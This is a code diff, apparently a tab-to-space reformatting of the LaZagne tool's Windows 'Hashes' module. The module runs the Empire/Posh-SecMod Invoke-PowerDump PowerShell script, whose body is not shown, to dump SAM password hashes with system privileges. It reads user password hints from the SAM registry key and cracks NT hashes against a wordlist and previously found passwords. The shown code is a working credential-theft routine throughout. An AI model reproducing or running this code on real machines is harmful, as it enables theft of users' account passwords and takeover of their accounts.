@@ -11,16 +11,17 @@ from lazagne.config.constant import *
 from _winreg import *
 import struct
 
-class Hashes(ModuleInfo):
-	def __init__(self):
-		self.wordlist = get_dico() + constant.passwordFound
-		options = {'command': '--hashes', 'action': 'store_true', 'dest': 'hashes', 'help': 'retrieve system hashes'}
-		ModuleInfo.__init__(self, 'hashes', 'windows', options, need_system_privileges=True)
 
-	def launch_powerdump(self):
-		# From https://github.com/adaptivethreat/Empire/...
-		function = 'Invoke-PowerDump'
-		script = '''
+class Hashes(ModuleInfo):
+    def __init__(self):
+        self.wordlist = get_dico() + constant.passwordFound
+        options = {'command': '--hashes', 'action': 'store_true', 'dest': 'hashes', 'help': 'retrieve system hashes'}
+        ModuleInfo.__init__(self, 'hashes', 'windows', options, need_system_privileges=True)
+
+    def launch_powerdump(self):
+        # From https://github.com/adaptivethreat/Empire/...
+        function = 'Invoke-PowerDump'
+        script = '''
 # Pulled from darkoperator's Posh-SecMod: 
 #   https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
 function Invoke-PowerDump
@@ -519,95 +520,95 @@ namespace PowerDump
 				}
 }
 		'''
-		
-		return powershell_execute(script, function)
 
-	def create_nthash(self, word):
-		generated_hash = hashlib.new('md4', word.encode('utf-16le')).digest()
-		return binascii.hexlify(generated_hash)
+        return powershell_execute(script, function)
 
-	def dictionaryAttack_Hash(self, _hash):
-		# check using a basic dictionary list and all passwords already found
-		for word in self.wordlist:
-			generated_hash = self.create_nthash(word)
-			if generated_hash == _hash:
-				return word
-		return False
+    def create_nthash(self, word):
+        generated_hash = hashlib.new('md4', word.encode('utf-16le')).digest()
+        return binascii.hexlify(generated_hash)
 
-	def get_password_hint(self):
-		
-		hints = []
-		# To do For XP
-		# HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\{User}
+    def dictionaryAttack_Hash(self, _hash):
+        # check using a basic dictionary list and all passwords already found
+        for word in self.wordlist:
+            generated_hash = self.create_nthash(word)
+            if generated_hash == _hash:
+                return word
+        return False
 
-		try:
-			keyVal = r"SAM\\SAM\\Domains\\Account\\Users"
-			aKey = OpenKey(HKEY_LOCAL_MACHINE, keyVal)
-		except:
-			return hints
-		
-		for i in range(1024):
-			try:
-				asubkey = EnumKey(aKey, i)
-			except:
-				break
+    def get_password_hint(self):
 
-			if asubkey ==  'Names':
-				continue	
-			
-			keyVal = 'UserPasswordHint'
-			subKey = OpenKey(aKey, asubkey)
-			try:
-				# Get username
-				v, _ = QueryValueEx(subKey, "V")
-				offset = int((struct.unpack('h', v[0x0c:0x0e]))[0] + 0xCC)
-				length = int((struct.unpack('h', v[0x10:0x12]))[0])
-				username = v[offset: offset+length].decode('utf-16').encode('utf-8', errors='replace')
+        hints = []
+        # To do For XP
+        # HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\{User}
 
-				# Get password hint
-				val, _ = QueryValueEx(subKey, "UserPasswordHint")
-				hint = val.decode('utf-16').encode('utf-8', errors='replace')
-				
-				hints.append({'Login': username, 'pwdHint': hint})
+        try:
+            keyVal = r"SAM\\SAM\\Domains\\Account\\Users"
+            aKey = OpenKey(HKEY_LOCAL_MACHINE, keyVal)
+        except:
+            return hints
 
-			except Exception, e:
-				pass
-			
-			CloseKey(subKey)
+        for i in range(1024):
+            try:
+                asubkey = EnumKey(aKey, i)
+            except:
+                break
 
-		return hints
+            if asubkey == 'Names':
+                continue
 
-	def run(self, software_name = None):
-		pwdFound = []
-		output = self.launch_powerdump()
-		password_hint = self.get_password_hint()
+            keyVal = 'UserPasswordHint'
+            subKey = OpenKey(aKey, asubkey)
+            try:
+                # Get username
+                v, _ = QueryValueEx(subKey, "V")
+                offset = int((struct.unpack('h', v[0x0c:0x0e]))[0] + 0xCC)
+                length = int((struct.unpack('h', v[0x10:0x12]))[0])
+                username = v[offset: offset + length].decode('utf-16').encode('utf-8', errors='replace')
 
-		values = {}
-		# Parse output
-		for line in output.split('\r\n'):
-			if line and line != '\n':
-				_pwd_hint = False
+                # Get password hint
+                val, _ = QueryValueEx(subKey, "UserPasswordHint")
+                hint = val.decode('utf-16').encode('utf-8', errors='replace')
 
-				try:
-					_login, _hash = line.split(':', 1)
-					_rid, _hash = _hash.split(':', 1)
+                hints.append({'Login': username, 'pwdHint': hint})
 
-					values = {'Login': _login, 'Hash': _hash, 'Rid': _rid}
-					
-					for hint in password_hint:
-						if _login == hint['Login']:
-							_pwd_hint = hint['pwdHint']
+            except Exception, e:
+                pass
 
-					if _pwd_hint:
-						values['Hint'] = _pwd_hint
+            CloseKey(subKey)
 
-					password = self.dictionaryAttack_Hash(_hash.split(':')[1])
-					if password:
-						values['Password'] = password
+        return hints
 
-					pwdFound.append(values)
-				
-				except Exception, e:
-					print_debug('ERROR', 'Error parsing hash: %s' % str(e))
+    def run(self, software_name=None):
+        pwdFound = []
+        output = self.launch_powerdump()
+        password_hint = self.get_password_hint()
 
-		return pwdFound
+        values = {}
+        # Parse output
+        for line in output.split('\r\n'):
+            if line and line != '\n':
+                _pwd_hint = False
+
+                try:
+                    _login, _hash = line.split(':', 1)
+                    _rid, _hash = _hash.split(':', 1)
+
+                    values = {'Login': _login, 'Hash': _hash, 'Rid': _rid}
+
+                    for hint in password_hint:
+                        if _login == hint['Login']:
+                            _pwd_hint = hint['pwdHint']
+
+                    if _pwd_hint:
+                        values['Hint'] = _pwd_hint
+
+                    password = self.dictionaryAttack_Hash(_hash.split(':')[1])
+                    if password:
+                        values['Password'] = password
+
+                    pwdFound.append(values)
+
+                except Exception, e:
+                    print_debug('ERROR', 'Error parsing hash: %s' % str(e))
+
+        return pwdFound
